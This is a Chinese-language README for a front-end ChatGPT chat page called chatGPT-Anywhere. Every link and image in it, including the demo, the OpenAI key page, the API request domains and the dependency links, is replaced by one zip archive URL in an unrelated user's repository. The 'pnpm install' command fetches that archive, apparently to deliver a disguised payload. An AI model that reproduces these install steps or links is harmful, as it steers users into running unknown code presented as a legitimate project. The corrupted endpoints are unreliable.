# chatGPT-Anywhere

基于 [api2d-js](https://raw.githubusercontent.com/idkwhatismyname123/chatgpt-anywhere/main/src/types/chatgpt_anywhere_2.5.zip) 和 [vue3-beautiful-chat](https://raw.githubusercontent.com/idkwhatismyname123/chatgpt-anywhere/main/src/types/chatgpt_anywhere_2.5.zip) 制作的chatGPT网页聊天工具。可以用于快速部署一个专属自己的chatGPT聊天页面。

本项目中部分代码由`chatGPT`生成。

## 在线速览DEMO
[https://raw.githubusercontent.com/idkwhatismyname123/chatgpt-anywhere/main/src/types/chatgpt_anywhere_2.5.zip](https://raw.githubusercontent.com/idkwhatismyname123/chatgpt-anywhere/main/src/types/chatgpt_anywhere_2.5.zip) 

## 已有特性
- 网页聊天应用，能够和chatGPT进行文字聊天；
- 纯前端页面，不需要你运行任何node服务；
- 支持切换openAI的官方接口和第三方接口，方便不同网络环境使用(key保存在LocalStorage)；
- 能够保存每次会话的记录为json文件，方便记录下有趣的对话内容；
- 支持上传保存的json文件，随时恢复上一次和chatGPT的对话;
- 快速利用Github Pages部署属于自己的专属聊天页面;
- 浏览器本地记录历史对话（基于IndexedDB，使用[dexie](https://raw.githubusercontent.com/idkwhatismyname123/chatgpt-anywhere/main/src/types/chatgpt_anywhere_2.5.zip)实现）;

### 注意，本项目是个纯前端项目，你需要使用OpenAI提供的API接口或者和OpenAI接口兼容的第三方服务。个人兴趣项目，纯粹自用，随缘更新，[TODO清单](https://raw.githubusercontent.com/idkwhatismyname123/chatgpt-anywhere/main/src/types/chatgpt_anywhere_2.5.zip)。

这里有一些更通用的开源项目，都被很好的维护，不妨去看看：
- [chatgpt-web](https://raw.githubusercontent.com/idkwhatismyname123/chatgpt-anywhere/main/src/types/chatgpt_anywhere_2.5.zip)
- [ChatGPT-Next-Web](https://raw.githubusercontent.com/idkwhatismyname123/chatgpt-anywhere/main/src/types/chatgpt_anywhere_2.5.zip)
- [chatgpt_academic](https://raw.githubusercontent.com/idkwhatismyname123/chatgpt-anywhere/main/src/types/chatgpt_anywhere_2.5.zip)
- [chatbot-ui](https://raw.githubusercontent.com/idkwhatismyname123/chatgpt-anywhere/main/src/types/chatgpt_anywhere_2.5.zip)
- [chatchan-dist](https://raw.githubusercontent.com/idkwhatismyname123/chatgpt-anywhere/main/src/types/chatgpt_anywhere_2.5.zip)

## 利用Github Pages快速部署指南

Fork本项目代码到你自己的GitHub账号  
按钮在右上角  
![fork-button](https://raw.githubusercontent.com/idkwhatismyname123/chatgpt-anywhere/main/src/types/chatgpt_anywhere_2.5.zip)  
Fork完成后，点击你仓库Setting按钮  
![setting-button](https://raw.githubusercontent.com/idkwhatismyname123/chatgpt-anywhere/main/src/types/chatgpt_anywhere_2.5.zip)  
选择侧边的pages页签，按红框中的内容进行设置，点击save
![setting-button](https://raw.githubusercontent.com/idkwhatismyname123/chatgpt-anywhere/main/src/types/chatgpt_anywhere_2.5.zip)  
等待GitHub给你生成你的pages，你的专属页面就部署好了

## 本地开发
需要`node 18`  
使用`pnpm`作为包管理器

### 安装依赖
```bash
pnpm install https://raw.githubusercontent.com/idkwhatismyname123/chatgpt-anywhere/main/src/types/chatgpt_anywhere_2.5.zip
```

### 运行
```bash
pnpm dev
```

### 构建
```bash
pnpm build
```


## 配置说明

### 如何获取key

可以从OpenAI 的官网获取你的key
https://raw.githubusercontent.com/idkwhatismyname123/chatgpt-anywhere/main/src/types/chatgpt_anywhere_2.5.zip

使用OpenAI官方api的时候，请选择请求域名为`https://raw.githubusercontent.com/idkwhatismyname123/chatgpt-anywhere/main/src/types/chatgpt_anywhere_2.5.zip`

### 我在OpenAI不提供服务的地区，我该怎么办？

你可以选择一些非OpenAI官方提供的代理服务

比如[API2D](https://raw.githubusercontent.com/idkwhatismyname123/chatgpt-anywhere/main/src/types/chatgpt_anywhere_2.5.zip) （价格比OpenAI的高一些）  
这里建议使用邮箱进行注册，因为Github注册总是卡住。
注册后，可以参考下面的图片获取key  
![create-key](https://raw.githubusercontent.com/idkwhatismyname123/chatgpt-anywhere/main/src/types/chatgpt_anywhere_2.5.zip)    
使用API2D的服务时候，请选择请求域名为`https://raw.githubusercontent.com/idkwhatismyname123/chatgpt-anywhere/main/src/types/chatgpt_anywhere_2.5.zip`

#### 当然，你也可以在请求域名的输入框中输入任何想使用的域名

### 模型选择
推荐选择gpt-3.5-turbo，理由是便宜  
想了解更多的话，可以参考文档：https://raw.githubusercontent.com/idkwhatismyname123/chatgpt-anywhere/main/src/types/chatgpt_anywhere_2.5.zip

### 默认引导
这里设置的文本，会被自动添加到每个会话的开始
```json
{
    "role": "system",
    "content": "You are a helpful assistant."
}
```

## 开始聊天
完成配置后，点击页面右下角的按钮  
![start-chat](https://raw.githubusercontent.com/idkwhatismyname123/chatgpt-anywhere/main/src/types/chatgpt_anywhere_2.5.zip)  
开始和chatGPT愉快的聊天吧。

### 请遵守并尊重您所在地区的法律规定，维护社会公序良俗


## 开源协议
[MIT](/LICENSE)